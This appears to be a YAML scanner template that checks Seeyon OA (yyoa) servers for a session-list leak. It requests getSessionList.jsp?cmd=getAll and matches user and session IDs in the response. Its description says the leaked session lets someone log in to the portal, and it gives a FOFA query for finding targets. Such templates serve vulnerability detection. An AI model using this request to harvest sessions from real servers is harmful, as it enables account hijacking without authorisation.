expression: r0()
id: seeyon-session-leak
info:
  author: sakura404x
  description: "\u786E\u5B9A\u6F0F\u6D1E\uFF0C\u4F7F\u7528session\u767B\u5F55\u4E3B\
    \u9875\u5373\u53EF (http://x.x.x.x/yyoa/portal/portalIndex.jsp), Cookie(JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXXXX)\n\
    \"fofa: yyoa\"\n"
  name: Seeyon session leakage
  reference:
  - https://mp.weixin.qq.com/s/V1bp8NedoNULf4G4cq8X1g
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b"<usrID>") && response.body.bcontains(b"<sessionID>")
    request:
      method: GET
      path: /yyoa/ext/https/getSessionList.jsp?cmd=getAll
